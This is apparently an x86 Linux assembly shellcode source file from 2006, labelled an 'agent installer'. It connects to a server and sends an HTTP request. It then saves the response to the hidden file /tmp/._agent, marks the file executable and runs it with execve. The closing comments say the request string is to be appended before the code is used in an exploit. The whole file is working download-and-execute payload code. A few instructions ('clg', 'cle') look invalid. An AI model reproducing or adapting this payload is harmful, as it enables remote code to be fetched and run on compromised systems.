;;
;; Linux Agent Installer Assembly Component
;; Abhisek Datta [abhisek.datta@gmail.com]
;; 17/05/2006
;;
BITS   32
GLOBAL _start

%define __NR_EXIT    1
%define __NR_READ    3
%define __NR_WRITE   4
%define __NR_OPEN    5
%define __NR_CLOSE   6
%define __NR_EXECVE  11
%define __NR_CHMOD   15


_start:
	xor  ebx, ebx
   sub  esp, 0x2000   ; Reserve some space on stack
   mov  ebp, esp

%define SOCKET    [ebp+4]     ; Socket Descriptor
%define FILE      [ebp+8]     ; File Descriptor
%define PATH      [ebp+12]    ; File Path
%define BUFFER    [ebp+16]    ; Buffer

   ; socket(AF_INET, SOCK_STREAM, 0)
socket:
	push ebx
	inc  ebx
	push ebx
	push byte 0x2
	push byte 0x66
	pop  eax
	mov  ecx, esp
	int  0x80
	xchg eax, ebx
   mov SOCKET, ebx    ; Save the socket descriptor

dup:
	pop  ecx
dup_loop:
	mov  al, 0x3f
	int  0x80
	dec  ecx
	jns  dup_loop

   ; connect(socket, (struct sockaddr*)&addr,sizeof(addr))
connect:
	pop  ebx
	pop  edx
	push dword 0x100007f ; host 127.0.0.1
	push word 0x1122     ; port 8721
	inc  ebx
	push bx
	mov  ecx, esp
	mov  al, 0x66
	push eax
	push ecx
	push ebx
	mov  ecx, esp
	inc  ebx
	int  0x80

   test eax, eax
   jnz exitProc   ; connect failed

   call getFileString
   db "/tmp/._agent",0x00

getFileString:
   pop ebx
   mov PATH, ebx  ; Save the file path for later execve

   ; open("/tmp/._agent",O_WRONLY|O_CREAT|O_TRUNC,0)
   mov ecx, 577
   mov edx, 0
   mov eax, __NR_OPEN
   int 0x80

   cmp eax, 0x00
   jle exitProc   ; File open failed
   
   mov FILE, eax  ; Save the file desriptor for later use

   ; chmod(path,0x777)
   mov ebx, PATH
   mov ecx, 511
   mov eax, __NR_CHMOD
   int 0x80

   jmp down

getRequestString:
   pop edi           ; EDI points to HTTP GET request string
   push edi          ; Save the string pointer

   ; strlen(edi)
   xor ecx, ecx
   xor al, al
   not ecx
   cld
   repne scasb
   not ecx
   dec ecx           ; ECX now contains the length of the request string
   
   ; write(sock,string,stringlen)
   ; eax = __NR_write
   ; ebx = SOCKET
   ; ecx = String
   ; edx = StringLen
   mov edx, ecx      ; EDX now contains string len
   pop ecx           ; ECX now contains string pointer
   mov ebx, SOCKET
   mov eax, __NR_WRITE
   int 0x80

   ; read(sock, buff, 1024)
   ; eax = __NR_read
   ; ebx = SOCKET
   ; ecx = Buffer
   ; edx = Buffer size
   lea ecx, BUFFER
   mov edx, 1024
   mov ebx, SOCKET
   mov eax, __NR_READ
   int 0x80

   ; Check if initial HTTP header reading failed
   cmp eax, 0x00
   jle exitProc

   push eax    ; We save the total bytes read from server on stack

   ; We have read eax bytes of data from the webserver
   ; Here we will walk down the read buffer looking for '\r\n\r\n'
   lea edx, BUFFER
   xor ecx, ecx
   clg
   cle
   
parserLoop:
   
   cmp dword [edx+ecx], 0x0a0d0a0d
   je parserLoopOut
   inc ecx
   cmp ecx, 1024
   jg exitProc  ; We dont want to loop more than 1024 times
   
   jmp parserLoop
   
parserLoopOut:
   add ecx, 0x04

   ; now write the HTTP data part on file
   ; write(FILE,buffer,len)
   pop eax
   mov edx, eax
   sub edx, ecx
   lea ebx, BUFFER
   add ebx, ecx
   mov ecx, ebx
   mov ebx, FILE
   mov eax, __NR_WRITE
   int 0x80

recvLoop:

   ; read(socket,buffer,1024)
   mov ebx, SOCKET
   lea ecx, BUFFER
   mov edx, 1024
   mov eax, __NR_READ
   int 0x80
   
   cmp eax, 0x00
   jle closeFile

   mov ebx, FILE
   lea ecx, BUFFER
   mov edx, eax
   mov eax, __NR_WRITE
   int 0x80

   jmp recvLoop

closeFile:
   ; close(file)
   mov ebx, FILE
   mov eax, __NR_CLOSE
   int 0x80

   ; close(socket)
   mov ebx, SOCKET
   mov eax, __NR_CLOSE
   int 0x80

   ;execve(path,[path,0x00],0x00)
   xor edx, edx
   mov ebx, PATH
   push edx
   push ebx
   mov ecx, esp
   mov eax, __NR_EXECVE
   int 0x80
   
exitProc
   nop
   xor eax, eax
   inc eax
   xor ebx, ebx
   int 0x80
   ; We can append the exit method here
  
down:
   call getRequestString
;db "GET http://www.yahoo.com/index.htm HTTP/1.0",0x0d,0x0a,"Host: agent-server",0x0d,0x0a,0x0d,0x0a,0x00

; This code must be *prepared* before using in an exploit, ie. The exact HTTP
; request to be sent to the remote server must be appended (NULL terminated) to
; the shellcode
